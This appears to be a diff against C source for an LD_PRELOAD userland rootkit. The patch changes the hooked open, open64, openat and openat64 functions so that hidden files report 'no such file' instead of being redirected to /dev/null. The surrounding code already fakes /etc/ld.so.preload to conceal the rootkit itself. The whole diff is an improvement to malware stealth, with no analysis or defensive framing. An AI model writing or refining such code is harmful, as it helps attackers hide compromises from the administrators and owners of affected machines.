@@ -595,8 +595,14 @@ int open(const char *pathname, int flags, ...) {
     }
     else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
         pathname = FAKE_PRELOAD;
-    else if (is_hidden(real_pathname))
-        pathname = "/dev/null";
+    else if (is_hidden(real_pathname)) {
+        if (flags & O_CREAT) pathname = "/dev/null";
+        else {
+            errno = ENOENT;
+            free(real_pathname);
+            return -1;
+        }
+    }
     free(real_pathname);
     return (*original_open)(pathname, flags, FILEMODE);
 }
@@ -619,8 +625,14 @@ int open64(const char *pathname, int flags, ...) {
     }
     else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
         pathname = FAKE_PRELOAD;
-    else if (is_hidden(real_pathname))
-        pathname = "/dev/null";
+    else if (is_hidden(real_pathname)) {
+        if (flags & O_CREAT) pathname = "/dev/null";
+        else {
+            errno = ENOENT;
+            free(real_pathname);
+            return -1;
+        }
+    }
     free(real_pathname);
     return (*original_open64)(pathname, flags, FILEMODE);
 }
@@ -689,8 +701,14 @@ int openat(int dirfd, const char *pathname, int flags, ...) {
     }
     else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
         pathname = FAKE_PRELOAD;
-    else if (is_hidden(real_pathname))
-        pathname = "/dev/null";
+    else if (is_hidden(real_pathname)) {
+        if (flags & O_CREAT) pathname = "/dev/null";
+        else {
+            errno = ENOENT;
+            free(real_pathname);
+            return -1;
+        }
+    }
     free(real_pathname);
     return (*original_openat)(dirfd, pathname, flags, FILEMODE);
 }
@@ -713,8 +731,14 @@ int openat64(int dirfd, const char *pathname, int flags, ...) {
     }
     else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
         pathname = FAKE_PRELOAD;
-    else if (is_hidden(real_pathname))
-        pathname = "/dev/null";
+    else if (is_hidden(real_pathname)) {
+        if (flags & O_CREAT) pathname = "/dev/null";
+        else {
+            errno = ENOENT;
+            free(real_pathname);
+            return -1;
+        }
+    }
     free(real_pathname);
     return (*original_openat64)(dirfd, pathname, flags, FILEMODE);
 }
